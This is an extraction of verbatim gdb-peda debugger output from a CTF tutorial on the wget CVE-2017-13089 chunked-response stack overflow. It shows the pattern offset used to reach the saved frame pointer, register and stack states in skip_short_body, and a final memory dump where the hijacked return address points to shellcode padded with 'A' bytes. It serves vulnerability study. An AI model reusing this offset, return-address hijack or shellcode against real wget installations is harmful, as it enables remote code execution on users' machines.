@@ -1,0 +1,153 @@
+# SOURCE: https://github.com/firmianay/CTF-All-In-One/blob/HEAD/doc/7.1.4_wget_2017-13089.md
+# (fenced code blocks containing PEDA output, verbatim; blocks separated by a line "# ---- block ----")
+# ---- block ----
+gdb-peda$ r localhost:6666
+gdb-peda$ pattern_offset $ebp
+1933668723 found at offset: 560
+gdb-peda$ searchmem AAA%AAsA
+Searching for 'AAA%AAsA' in: None ranges
+Found 2 results, display max 2 items:
+ [heap] : 0x6aad83 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
+[stack] : 0x7fffffffcf40 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"...)
+# ---- block ----
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+RAX: 0xffffffff00000300
+RBX: 0x468722 --> 0x206f4e0050545448 ('HTTP')
+RCX: 0xffffffda
+RDX: 0x1
+RSI: 0xfffffd00
+RDI: 0x6aafab --> 0xfae98148c931000a
+RBP: 0x7fffffffd170 --> 0x7fffffffd580 --> 0x7fffffffd8a0 --> 0x7fffffffd9c0 --> 0x7fffffffdbd0 --> 0x452350 (<__libc_csu_init>:	push   r15)
+RSP: 0x7fffffffcf20 --> 0xffffffffffffffff
+RIP: 0x41ef0f (<skip_short_body+150>:	mov    QWORD PTR [rbp-0x8],rax)
+R8 : 0x0
+R9 : 0xfffffffffffffff
+R10: 0x0
+R11: 0x7ffff74045e0 --> 0x2000200020002
+R12: 0x404ca0 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffdcb0 --> 0x2
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x41ef04 <skip_short_body+139>:	mov    rsi,rcx
+   0x41ef07 <skip_short_body+142>:	mov    rdi,rax
+   0x41ef0a <skip_short_body+145>:	call   0x404660 <strtol@plt>
+=> 0x41ef0f <skip_short_body+150>:	mov    QWORD PTR [rbp-0x8],rax
+   0x41ef13 <skip_short_body+154>:	mov    rax,QWORD PTR [rbp-0x10]
+   0x41ef17 <skip_short_body+158>:	mov    rdi,rax
+   0x41ef1a <skip_short_body+161>:	call   0x404380 <free@plt>
+   0x41ef1f <skip_short_body+166>:	mov    QWORD PTR [rbp-0x10],0x0
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffcf20 --> 0xffffffffffffffff
+0008| 0x7fffffffcf28 --> 0x4ffffcf01
+0016| 0x7fffffffcf30 --> 0x13
+0024| 0x7fffffffcf38 --> 0x6aafab --> 0xfae98148c931000a
+0032| 0x7fffffffcf40 --> 0xffffffff00000028
+0040| 0x7fffffffcf48 --> 0x7ffff7652540 --> 0xfbad2887
+0048| 0x7fffffffcf50 --> 0x7fffffffcfc0 ("401 Not Authorized\n")
+0056| 0x7fffffffcf58 --> 0x13
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x000000000041ef0f in skip_short_body ()
+# ---- block ----
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+RAX: 0x4
+RBX: 0x468722 --> 0x206f4e0050545448 ('HTTP')
+RCX: 0x7fffffffcf40 --> 0xffffffff00000028
+RDX: 0x300
+RSI: 0x7fffffffcf40 --> 0xffffffff00000028
+RDI: 0x4
+RBP: 0x7fffffffd170 --> 0x7fffffffd580 --> 0x7fffffffd8a0 --> 0x7fffffffd9c0 --> 0x7fffffffdbd0 --> 0x452350 (<__libc_csu_init>:	push   r15)
+RSP: 0x7fffffffcf20 --> 0xffffffff00000300
+RIP: 0x41efd6 (<skip_short_body+349>:	call   0x4062c5 <fd_read>)
+R8 : 0x0
+R9 : 0x1
+R10: 0x0
+R11: 0x7ffff74045e0 --> 0x2000200020002
+R12: 0x404ca0 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffdcb0 --> 0x2
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x41efc9 <skip_short_body+336>:	movsd  xmm0,QWORD PTR [rip+0x4aa6f]        # 0x469a40
+   0x41efd1 <skip_short_body+344>:	mov    rsi,rcx
+   0x41efd4 <skip_short_body+347>:	mov    edi,eax
+=> 0x41efd6 <skip_short_body+349>:	call   0x4062c5 <fd_read>
+   0x41efdb <skip_short_body+354>:	mov    DWORD PTR [rbp-0x14],eax
+   0x41efde <skip_short_body+357>:	cmp    DWORD PTR [rbp-0x14],0x0
+   0x41efe2 <skip_short_body+361>:	jg     0x41f029 <skip_short_body+432>
+   0x41efe4 <skip_short_body+363>:	movzx  eax,BYTE PTR [rip+0x269bf0]        # 0x688bdb <opt+571>
+Guessed arguments:
+arg[0]: 0x4
+arg[1]: 0x7fffffffcf40 --> 0xffffffff00000028
+arg[2]: 0x300
+arg[3]: 0x7fffffffcf40 --> 0xffffffff00000028
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffcf20 --> 0xffffffff00000300
+0008| 0x7fffffffcf28 --> 0x4ffffcf01
+0016| 0x7fffffffcf30 --> 0x13
+0024| 0x7fffffffcf38 --> 0x6aafab --> 0xfae98100007ffff7
+0032| 0x7fffffffcf40 --> 0xffffffff00000028
+0040| 0x7fffffffcf48 --> 0x7ffff7652540 --> 0xfbad2887
+0048| 0x7fffffffcf50 --> 0x7fffffffcfc0 ("401 Not Authorized\n")
+0056| 0x7fffffffcf58 --> 0x13
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x000000000041efd6 in skip_short_body ()
+# ---- block ----
+gdb-peda$ n
+[----------------------------------registers-----------------------------------]
+RAX: 0x0
+RBX: 0x468722 --> 0x206f4e0050545448 ('HTTP')
+RCX: 0x7ffff7384260 (<__read_nocancel+7>:	cmp    rax,0xfffffffffffff001)
+RDX: 0x200
+RSI: 0x7fffffffcf40 --> 0xfffae98148c93148
+RDI: 0x4
+RBP: 0x4141414141414141 ('AAAAAAAA')
+RSP: 0x7fffffffd178 --> 0x7fffffffcf40 --> 0xfffae98148c93148
+RIP: 0x41f0ed (<skip_short_body+628>:	ret)
+R8 : 0x7fffffffcdb0 --> 0x383
+R9 : 0x1
+R10: 0x0
+R11: 0x246
+R12: 0x404ca0 (<_start>:	xor    ebp,ebp)
+R13: 0x7fffffffdcb0 --> 0x2
+R14: 0x0
+R15: 0x0
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x41f0e2 <skip_short_body+617>:	call   0x42a0f5 <debug_logprintf>
+   0x41f0e7 <skip_short_body+622>:	mov    eax,0x1
+   0x41f0ec <skip_short_body+627>:	leave  
+=> 0x41f0ed <skip_short_body+628>:	ret
+   0x41f0ee <modify_param_name>:	push   rbp
+   0x41f0ef <modify_param_name+1>:	mov    rbp,rsp
+   0x41f0f2 <modify_param_name+4>:	sub    rsp,0x30
+   0x41f0f6 <modify_param_name+8>:	mov    QWORD PTR [rbp-0x28],rdi
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffd178 --> 0x7fffffffcf40 --> 0xfffae98148c93148
+0008| 0x7fffffffd180 --> 0xa300a ('\n0\n')
+0016| 0x7fffffffd188 --> 0x0
+0024| 0x7fffffffd190 --> 0x7fffffffdad4 --> 0x0
+0032| 0x7fffffffd198 --> 0x7fffffffd780 --> 0x0
+0040| 0x7fffffffd1a0 --> 0x6a9a00 --> 0x68acb0 ("http://localhost:6666/")
+0048| 0x7fffffffd1a8 --> 0x6a9a00 --> 0x68acb0 ("http://localhost:6666/")
+0056| 0x7fffffffd1b0 --> 0x0
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+0x000000000041f0ed in skip_short_body ()
+gdb-peda$ x/20gx 0x7fffffffcf40
+0x7fffffffcf40:	0xfffae98148c93148	0xffffef058d48ffff  <-- shellcode
+0x7fffffffcf50:	0x1e60cbb5c5bb48ff	0x48275831481bb2ba
+0x7fffffffcf60:	0xaff4e2fffffff82d	0xac799d0156f9938e
+0x7fffffffcf70:	0x4c53e1ba7613e4db	0x4c53b2ba7d4da352
+0x7fffffffcf80:	0xea1bb2ba16889953	0x931bdac9310ea2d7
+0x7fffffffcf90:	0x411bb7b5f8e983e2	0x4141414141414141
+0x7fffffffcfa0:	0x4141414141414141	0x4141414141414141
+0x7fffffffcfb0:	0x4141414141414141	0x4141414141414141
+0x7fffffffcfc0:	0x4141414141414141	0x4141414141414141
+0x7fffffffcfd0:	0x4141414141414141	0x4141414141414141
